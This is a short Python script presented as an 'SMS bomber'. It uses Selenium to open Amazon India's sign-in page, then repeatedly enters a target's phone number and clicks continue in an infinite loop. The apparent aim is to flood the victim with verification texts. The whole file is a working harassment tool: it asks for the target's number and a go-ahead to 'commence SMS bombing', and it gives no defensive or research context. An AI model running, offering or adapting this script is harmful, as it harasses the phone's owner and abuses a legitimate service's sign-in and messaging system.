# basic SMS bomber using Amazon web log in and selenium  webdriver
import time
from selenium import webdriver

def smsBomber(phone_num):

    driver = webdriver.Firefox()
    driver.get('https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fcss%2Fhomepage.html%3Ffrom%3Dhz%26ref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&')

    while(1):
        driver.find_element_by_xpath('//*[@id="ap_email"]').send_keys(phone_num)

        driver.find_element_by_xpath('//*[@id="continue"]').click()

        time.sleep(5)


print("Welcome To SMS Bomber Prototype")
print("\nEnter target's phone number:")

phone_num = int(input())

print("Commence SMS Bombing?: (y/n)")

confirmation =input()

if confirmation == 'y':
    print("SMS Bomber activated")
    smsBomber(phone_num)

elif confirmation == 'n':
    print("SMS Bombing aborted")